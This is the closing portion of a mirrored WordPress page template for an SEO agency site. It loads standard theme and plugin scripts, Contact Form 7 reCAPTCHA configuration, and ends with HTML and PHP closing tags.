	<script type='text/javascript' src='wp-includes/js/comment-reply.minfcc2.js?ver=5.7.9'
		id='comment-reply-js'></script>
	<script type='text/javascript'
		src='wp-content/plugins/js_composer/assets/js/dist/js_composer_front.min10df.js?ver=6.2.0'
		id='wpb_composer_front_js-js'></script>
	<script type='text/javascript' id='qode-like-js-extra'>
		/* <![CDATA[ */
		var qodeLike = { "ajaxurl": "https:\/\/www.eliteseoagency.com\/wp-admin\/admin-ajax.php" };
/* ]]> */
	</script>
	<script type='text/javascript' src='wp-content/themes/bridge/js/plugins/qode-like.minfcc2.js?ver=5.7.9'
		id='qode-like-js'></script>
	<script type='text/javascript'
		src='../www.google.com/recaptcha/api7a12.js?render=6Lf7HKYZAAAAAK2Pt7g-aOd7NUv4wO9pBSnakeYi&amp;ver=3.0'
		id='google-recaptcha-js'></script>
	<script type='text/javascript' id='wpcf7-recaptcha-js-extra'>
		/* <![CDATA[ */
		var wpcf7_recaptcha = { "sitekey": "6Lf7HKYZAAAAAK2Pt7g-aOd7NUv4wO9pBSnakeYi", "actions": { "homepage": "homepage", "contactform": "contactform" } };
/* ]]> */
	</script>
	<script type='text/javascript' src='wp-content/plugins/contact-form-7/modules/recaptcha/indexc225.js?ver=5.4.1'
		id='wpcf7-recaptcha-js'></script>
	<script type='text/javascript' src='wp-includes/js/wp-embed.minfcc2.js?ver=5.7.9' id='wp-embed-js'></script>



</body>



</html>

<?php
}
?>